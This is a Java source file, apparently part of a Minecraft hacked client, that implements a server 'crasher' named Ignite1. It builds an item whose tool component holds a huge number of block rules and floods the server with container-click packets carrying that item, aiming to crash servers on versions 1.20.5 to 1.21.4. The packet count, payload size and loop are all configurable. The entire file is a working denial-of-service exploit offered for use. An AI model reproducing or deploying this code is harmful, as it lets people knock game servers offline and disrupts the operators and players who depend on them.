package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataTool;
import us.whitedev.protocol.components.objects.ItemStack;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Ignite1 implements Crasher {
    private static final String METHOD_NAME = "Ignite1";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int size2 = Integer.parseInt(args[4]);
        int threadSleep = Integer.parseInt(args[5]);
        long loopAmount = Long.parseLong(args[6]);
        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            DataTool toolComponent = createToolComponent(size, size2);
            DataComponents components = new DataComponents();
            components.put(toolComponent);

            ItemStack item = new ItemStack(1, 1, components);

            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!enabled || check.get() >= loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    return;
                }
                PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 37,
                        PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.LEFT_CLICK,
                        item, new Int2ObjectArrayMap<>()), packets);
                check.getAndIncrement();
            };
            executorService.scheduleWithFixedDelay(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.20.5/1.21.4&7, and your current protocol is &c" + protocol, true);
        }
    }

    private DataTool createToolComponent(int size, int size2) {
        List<DataTool.Rule> rules = new ArrayList<>();

        int[] blockEntries = new int[size];
        Arrays.fill(blockEntries, 1);

        for (int i = 0; i < size2; i++) {
            rules.add(new DataTool.Rule(blockEntries, 6.0f, true));
        }

        return new DataTool(rules, 1.0f, 1);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[1000], size[910], size2[100], thread-sleep[2000], loop-amount[15]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Size2", OptionType.INTEGER),
                new OptionUtil("Thread Sleep", OptionType.INTEGER),
                new OptionUtil("Loop Amount", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "1.20.5+ ToolComponent Rules Crash";
    }
}